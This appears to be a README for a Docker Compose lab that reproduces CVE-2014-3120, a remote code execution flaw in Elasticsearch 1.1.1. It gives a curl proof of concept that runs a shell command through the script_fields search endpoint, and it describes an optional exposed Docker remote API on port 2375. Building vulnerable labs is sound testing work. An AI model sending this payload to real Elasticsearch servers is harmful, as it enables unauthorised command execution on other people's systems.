# Vulnerable Docker Setup for CVE-2014-3120

This repository provides a Docker Compose environment that reproduces the conditions needed to exploit CVE‑2014‑3120, an Elasticsearch remote code execution vulnerability present in versions 1.1.1 and 1.2.0.

## Services

- **elasticsearch** – Elasticsearch 1.1.1 (from `docker.elastic.co`) running in single‑node mode, exposing HTTP port 9200.
- **vulnerable-docker** – (optional) Docker‑in‑Docker instance exposing the Docker remote API on port 2375. This service is retained for completeness but is not required for the Elasticsearch exploit.

## Deploy

```bash
cd ./../../dockers/CVE-2014-3120/custom_no_tool
docker compose up -d
```

Elasticsearch will be reachable at `http://localhost:9200`. You can test the vulnerable scripting endpoint, for example:

```bash
curl -XGET 'http://localhost:9200/_search' -H 'Content-Type: application/json' -d '{"script_fields": {"test": {"script": "java.lang.Runtime.getRuntime().exec(\"id\").getText()"}}}'
```

## Note

The setup uses an old Elasticsearch image that is intentionally vulnerable. **Do not run this configuration in any production or trusted environment.**